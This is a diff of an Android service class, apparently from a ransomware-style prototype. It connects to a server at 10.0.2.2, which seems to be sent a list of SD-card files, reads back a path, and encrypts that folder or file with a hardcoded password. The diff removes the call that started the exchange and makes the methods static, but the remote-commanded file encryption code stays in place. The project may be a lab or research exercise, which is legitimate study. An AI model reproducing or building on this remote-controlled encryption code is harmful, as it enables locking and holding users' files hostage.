@@ -1,12 +1,9 @@
 package webroot.com.webrootencrypt;
 
 import android.app.IntentService;
-import android.app.Service;
 import android.content.Intent;
-import android.os.AsyncTask;
 import android.os.IBinder;
 import android.os.NetworkOnMainThreadException;
-import android.os.SystemClock;
 import android.util.Log;
 import android.widget.Toast;
 
@@ -20,6 +17,7 @@ import java.net.InetAddress;
 import java.net.Socket;
 import java.net.UnknownHostException;
 import java.util.ArrayList;
+
 
 /**
  * Created by jfermin on 11/9/2015.
@@ -42,13 +40,6 @@ public class ClientService extends IntentService {
     public void onHandleIntent(Intent intent) {
         // Let it continue running until it is stopped.
         // Toast.makeText(this, "Service Started", Toast.LENGTH_LONG).show();
-        ArrayList<String> data = ( ArrayList<String>) intent.getExtras().get("FILES_IN_SDCARD");
-        final Socket socket = sendToClient(data);
-        new Thread(new Runnable() {
-            public void run() {
-                listenToServer(socket);
-            }
-        }).start();
     }
 
     @Override
@@ -57,21 +48,22 @@ public class ClientService extends IntentService {
         return START_STICKY;
     }
 
-    protected void listenToServer(Socket socket)
+    protected static void listenToServer(Socket socket)
     {
         try {
-            BufferedReader in = null;
+            BufferedReader in;
 
             try {
                 in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
 
-
-                String text = "";
+                // get lines from client
+                String text;
                 String finalText = "";
                 while ((text = in.readLine()) != null) {
                     finalText += text;
                 }
-                System.out.println(finalText);
+
+                // Encrypt folder/file from sdcard
                 Encrypt.encrypt("/storage/sdcard/" + finalText, "password");
                 Log.d("TCP", "C: Encrypted.");
                 Log.d("TCP", "C: Done.");
@@ -90,7 +82,7 @@ public class ClientService extends IntentService {
         }
     }
 
-    protected Socket sendToClient(ArrayList<String> toSend) {
+    protected static Socket sendToClient(ArrayList<String> toSend) {
         try {
             InetAddress serverAddr = InetAddress.getByName("10.0.2.2");
             Log.d("TCP", "C: Connecting...");
